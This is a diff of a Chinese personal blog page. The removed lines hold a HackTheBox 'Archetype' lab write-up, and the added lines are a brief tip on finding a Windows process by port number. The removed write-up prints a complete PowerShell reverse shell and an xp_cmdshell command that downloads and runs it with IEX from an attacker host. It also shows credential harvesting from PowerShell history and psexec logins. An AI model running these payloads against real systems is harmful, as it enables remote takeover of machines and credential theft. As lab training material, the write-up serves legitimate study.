@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>HTB start point 1 - Archetype | Elin 的空间</title>
-  <meta name="keywords" content=" windows ">
-  <meta name="description" content="HTB start point 1 - Archetype | Elin 的空间">
+  <title>windows 中通过端口号查看进程 | Elin 的空间</title>
+  <meta name="keywords" content="">
+  <meta name="description" content="windows 中通过端口号查看进程 | Elin 的空间">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="netstat -ano | findstr &lt;port&gt; 得到pid, 然后 tasklist | grep &lt;pid&gt;">
 <meta property="og:type" content="article">
@@ -1266,9 +1266,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-HTB-start-point-1-archetype" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-windows-中通过端口号查看进程" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">HTB start point 1 - Archetype</h1>
+        <h1 class="article-title">windows 中通过端口号查看进程</h1>
     
     <div class="article-meta">
         
@@ -1278,24 +1278,15 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="渗透">渗透</a> > 
-            
-            <a  data-rel="渗透&lt;---&gt;HTB">HTB</a>
+            <a  data-rel="系统">系统</a>
             
         </span>
         
-        
-        <span class="tag">
-            <i class="iconfont icon-tag"></i>
-            
-            <a class="color3">windows</a>
-            
-        </span>
         
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2022-06-20 17:00:03'>2021-07-27 16:28</time>
+            发布时间 : <time class="date" title='最后更新: 2022-06-20 17:00:03'>2022-06-20 16:58</time>
         
     </div>
     <div class="article-meta">
@@ -1317,7 +1308,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration"><span class="toc-text">Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Foothold"><span class="toc-text">Foothold</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-escalation"><span class="toc-text">Privilege escalation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E7%BB%AD"><span class="toc-text">后续</span></a></li></ol>
+        
     
 <style>
     .left-col .switch-btn,
@@ -1333,91 +1324,9 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <ul>
-<li><a target="_blank" rel="noopener" href="https://medium.com/@dpgg/hackthebox-archetype-starting-point-391af7b10fea">参考</a>解读官方文档</li>
-<li><a target="_blank" rel="noopener" href="http://imin.red/2020-04-15-0x01-startingpoint-archetype/">这篇文章</a>详细讲述了思考过程</li>
-<li><a target="_blank" rel="noopener" href="https://www.hackingarticles.in/smb-penetration-testing-port-445/">这篇文章</a>介绍了关于smb的渗透技巧，包括使用msf</li>
-<li><a target="_blank" rel="noopener" href="https://www.hackingarticles.in/mssql-penetration-testing-metasploit/">MSSQL Penetration Testing with Metasploit</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.hackingarticles.in/smb-penetration-testing-port-445/">SMB Penetration Testing (Port 445)</a></li>
-</ul>
-<h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><p>侦察阶段，根据<a href="/2021/07/26/Linux-%E4%BE%A6%E5%AF%9F%E6%B8%85%E5%8D%95/" title="Linux 侦察清单">Linux 侦察清单</a>，收集开启的端口</p>
-<div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.27 | grep ^[0-9] | cut -d <span class="hljs-string">&#x27;/&#x27;</span> -f 1 | tr <span class="hljs-string">&#x27;\n&#x27;</span> <span class="hljs-string">&#x27;,&#x27;</span> | sed s/,$//)</span>
-<span class="line"></br></span>
-<span class="line">nmap -sC -sV -p<span class="hljs-variable">$ports</span> 10.10.10.27 </span>
-</code></pre></div></div>
-
-<p>通过扫描可以发现<code>445</code>端口是开启的，服务是SQL Server。</p>
-<p>根据<a href="/2021/07/27/smb-%E6%B8%97%E9%80%8F%E6%B8%85%E5%8D%95/" title="smb 渗透清单">smb 渗透清单</a></p>
-<p>可能的漏洞为匿名用户登录</p>
-<p>使用 <code>smbclient -L 10.10.10.27</code>发现</p>
-<p><img src="/2021/07/27/HTB-start-point-1-archetype/1611823952726.png"></p>
-<p>其中有backups可能是突破点，使用 <code>smbclient //10.10.10.27/backups</code>进入smb共享文件，然后发现在目录下有<code>.dtsConfig</code>的文件。</p>
-<blockquote>
-<p>A DTSCONFIG file is an XML configuration file used to apply property values to SQL Server Integration Services (SSIS) packages. The file contains one or more package configurations that consist of metadata such as the server name, database names, and other connection properties to configure SSIS packages.</p>
-</blockquote>
-<p>也就是SQLServer的配置文件。</p>
-<p>使用<code>get &lt;filename&gt;</code>命令将文件拷贝到本地后打开发现，<br><img src="/2021/07/27/HTB-start-point-1-archetype/1611824416119.png"></p>
-<p>这个也就是数据库的用户。但是要考虑的是，这个用户可能是没有高级权限的。</p>
-<h2 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h2><p>要登录数据库，使用的是<a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket/tree/master/impacket">impackets</a>工具箱中的<code>mssqlclient.py</code> 工具。</p>
-<p><code>mssqlclint.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth</code></p>
-<ul>
-<li>注意是<code>/</code></li>
-<li>windows的验证 <code>-windows-auth</code></li>
-</ul>
-<p>当进入mssql之后，要确定权限。</p>
-<ul>
-<li><code>select IS_SRVROLEMEMBER(&#39;sysadmin&#39;)</code></li>
-</ul>
-<p>确定权限后打开<code>xp_cmdshell</code>运行权限。 在mssqlclient.py中可以直接使用<code>enable_xp_cmdshell</code>一键开启</p>
-<p>然后通过方向连接获得shell。</p>
-<p>手册给出的手动解法是写一个getshell的文件，然后让目标机下载并执行。</p>
-<p>所以这里就有4个点：</p>
-<ol>
-<li>要让目标机下载攻击机中的文件，需要在攻击机上开启下载端口，这里给出的方法是使用http的方式下载。<ul>
-<li><code>python -m http.server 1633</code></li>
-</ul>
-</li>
-<li>目标机下载执行后需要与攻击机建立shell连接，所以需要另外一个监听端口。<ul>
-<li><code>nc -nvlp 5711</code></li>
-</ul>
-</li>
-<li>攻击机上<code>shell.ps1</code>这个文件怎么写</li>
-</ol>
-<div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-php codeBlockLines"><span class="line"><span class="hljs-variable">$client</span> = <span class="hljs-keyword">New</span>-<span class="hljs-keyword">Object</span> System.Net.Sockets.TCPClient(<span class="hljs-string">&quot;10.10.14.32&quot;</span>,<span class="hljs-number">5711</span>);<span class="hljs-variable">$stream</span> = <span class="hljs-variable">$client</span>.GetStream();[byte[]]<span class="hljs-variable">$bytes</span> = <span class="hljs-number">0</span>.<span class="hljs-number">.65535</span>|%&#123;<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">while</span>((<span class="hljs-variable">$i</span> = <span class="hljs-variable">$stream</span>.Read(<span class="hljs-variable">$bytes</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$bytes</span>.Length)) -ne <span class="hljs-number">0</span>)&#123;;<span class="hljs-variable">$data</span> = (<span class="hljs-keyword">New</span>-<span class="hljs-keyword">Object</span> -TypeName System.Text.ASCIIEncoding).GetString(<span class="hljs-variable">$bytes</span>,<span class="hljs-number">0</span>, <span class="hljs-variable">$i</span>);<span class="hljs-variable">$sendback</span> = (iex <span class="hljs-variable">$data</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> | Out-<span class="hljs-keyword">String</span> );<span class="hljs-variable">$sendback2</span> = <span class="hljs-variable">$sendback</span> + <span class="hljs-string">&quot;# &quot;</span>;<span class="hljs-variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="hljs-variable">$sendback2</span>);<span class="hljs-variable">$stream</span>.Write(<span class="hljs-variable">$sendbyte</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$sendbyte</span>.Length);<span class="hljs-variable">$stream</span>.Flush()&#125;;<span class="hljs-variable">$client</span>.Close() </span>
-</code></pre></div></div>
-<ol start="4">
-<li>目标机上如何下载并运行<code>shell.ps1</code>文件</li>
-</ol>
-<div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-pgsql codeBlockLines"><span class="line">xp_cmdshell &quot;powershell &quot;IEX (<span class="hljs-built_in">New</span>-<span class="hljs-keyword">Object</span> Net.WebClient).DownloadString(\&quot;http://10.10.14.32:1633/shell.ps1\&quot;);&quot;&quot;</span>
-</code></pre></div></div>
-
-<p>这样就可以获得shell了。 那么还有没有其他的方法呢？ 后面讨论</p>
-<h2 id="Privilege-escalation"><a href="#Privilege-escalation" class="headerlink" title="Privilege escalation"></a>Privilege escalation</h2><p>在本案例中，权限提升是通过找到目标机上的历史记录得到Administrator用户的。</p>
-<div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-powershell codeBlockLines"><span class="line"><span class="hljs-built_in">type</span> C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span>
-</code></pre></div></div>
-
-<p><img src="/2021/07/27/HTB-start-point-1-archetype/1611890465860.png"></p>
-<p><code>net use</code> 是将远端smb映射到本地上，并且通常会使用用户。</p>
-<p>得到用户密码之后就是登录的操作了。</p>
-<p>使用的工具是<code>psexec</code></p>
-<p><code>psexec administrator@10.10.10.27</code></p>
-<p>flag 就在桌面目录上</p>
-<h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>get shell 的工具：</p>
-<ol>
-<li>MSF <code>exploit/windows/smb/psexec</code><ul>
-<li>使用<a target="_blank" rel="noopener" href="https://github.com/trustedsec/unicorn">unicorn</a>可以生成生成对应的shellcode</li>
-</ul>
-</li>
-<li>psexec</li>
-<li>Winexe</li>
-<li>smbexec.py</li>
-<li>wmiexec.py</li>
-<li>CrackMapExec</li>
-<li></li>
-</ol>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://blog.ropnop.com/using-credentials-to-own-windows-boxes/">参考文章</a></li>
-</ul>
+        <p><code>netstat -ano | findstr &lt;port&gt;</code></p>
+<p>得到pid, 然后</p>
+<p><code>tasklist | grep &lt;pid&gt;</code></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 365433079@qq.com </span>
